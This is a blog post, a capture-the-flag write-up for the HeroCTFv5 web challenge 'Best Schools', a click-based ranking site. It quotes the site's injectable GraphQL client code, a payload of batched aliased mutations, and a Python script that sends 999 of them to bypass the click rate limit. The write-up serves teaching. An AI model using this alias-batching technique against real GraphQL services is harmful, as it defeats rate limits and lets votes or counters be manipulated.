<!doctype html>
<html lang="en-us">
  <head>
    <title>[HeroCTFv5 - Web] Best Schools // chrootcommit</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.113.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chrootcommit" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.1fe426fd82899b3823133b4b6fadb0e1f0d8332eecc710a4dfe43101ac5895e0.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[HeroCTFv5 - Web] Best Schools"/>
<meta name="twitter:description" content="under B0rn2PwnCTF team
Overview An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the &lsquo;Flag CyberSecurity School&rsquo; in first place and you&rsquo;ll get your reward!
Detect vulnerable source code function updateNbClick(schoolName) { var updated_school = []; fetch(&#34;/graphql&#34;, { method: &#34;POST&#34;, headers:{ &#34;Content-Type&#34;: &#34;application/json&#34;, &#34;Accept&#34;: &#34;application/json&#34; }, body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: &#34;${schoolName}&#34;){schoolId, nbClick} }`}) })."/>

    <meta property="og:title" content="[HeroCTFv5 - Web] Best Schools" />
<meta property="og:description" content="under B0rn2PwnCTF team
Overview An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the &lsquo;Flag CyberSecurity School&rsquo; in first place and you&rsquo;ll get your reward!
Detect vulnerable source code function updateNbClick(schoolName) { var updated_school = []; fetch(&#34;/graphql&#34;, { method: &#34;POST&#34;, headers:{ &#34;Content-Type&#34;: &#34;application/json&#34;, &#34;Accept&#34;: &#34;application/json&#34; }, body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: &#34;${schoolName}&#34;){schoolId, nbClick} }`}) })." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chrootcommit.github.io/posts/heroctfv5-best-school/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-14T18:06:23-04:00" />
<meta property="article:modified_time" content="2023-05-14T18:06:23-04:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://chrootcommit.github.io/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
      <span class="app-header-title">chrootcommit</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/posts/about">About</a>
            -
          
          <a class="app-header-menu-item" href="/">Home</a>
            -
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Junior Cybersecurity Consultant.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">[HeroCTFv5 - Web] Best Schools</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          May 14, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          2 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://chrootcommit.github.io/tags/heroctfv5/">HeroCTFv5</a>
              <a class="tag" href="https://chrootcommit.github.io/tags/web/">Web</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>under B0rn2PwnCTF team</p>
<h1 id="overview">Overview</h1>
<p>An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the &lsquo;Flag CyberSecurity School&rsquo; in first place and you&rsquo;ll get your reward!</p>
<p><img src="/heroctf/best_schools_overview.png" alt=""></p>
<h1 id="detect-vulnerable-source-code">Detect vulnerable source code</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">updateNbClick</span>(<span style="color:#a6e22e">schoolName</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">updated_school</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/graphql&#34;</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>,
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;Accept&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>
</span></span><span style="display:flex;"><span>                    },
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#a6e22e">query</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`mutation { increaseClickSchool(schoolName: &#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">schoolName</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;){schoolId, nbClick} }`</span>})
</span></span><span style="display:flex;"><span>            }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">json</span>())
</span></span><span style="display:flex;"><span>            .<span style="color:#a6e22e">then</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">undefined</span>)
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">error</span>)
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">`click</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">increaseClickSchool</span>.<span style="color:#a6e22e">schoolId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">increaseClickSchool</span>.<span style="color:#a6e22e">nbClick</span>
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            )
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></div><p>For each click on a school, the website increment the click number and we have to wait few minutes before retry another click.
We note the the backend use mutate instruction to increase click number through Graphql. We perform graphql injection in order to abuse the increaseClickSchool function.</p>
<h1 id="payload">Payload</h1>
<pre tabindex="0"><code>{&#34;query&#34;: &#34;mutation  { mutation1: increaseClickSchool(schoolName: \&#34;Flag CyberSecurity School\&#34;) { schoolId, nbClick } mutation2: increaseClickSchool(schoolName: \&#34;Flag CyberSecurity School\&#34;) { schoolId, nbClick } mutation3: increaseClickSchool(schoolName: \&#34;Flag CyberSecurity School\&#34;) { schoolId, nbClick } mutation20: increaseClickSchool(schoolName: \&#34;Flag CyberSecurity School\&#34;) { schoolId, nbClick } }&#34;}
</code></pre><h1 id="exploit">exploit</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://dyn-01.heroctf.fr:11896/graphql&#39;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>, <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
</span></span><span style="display:flex;"><span>mutations <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mutation</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">: increaseClickSchool(schoolName: &#34;Flag CyberSecurity School&#34;) </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74"> schoolId, nbClick </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000</span>))
</span></span><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mutation </span><span style="color:#ae81ff">{{</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>mutations<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;query&#39;</span>: query}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>headers, json<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>Launch this script 2 times and get the flag.</p>
<p><img src="/heroctf/best_schools_flag.png" alt=""></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
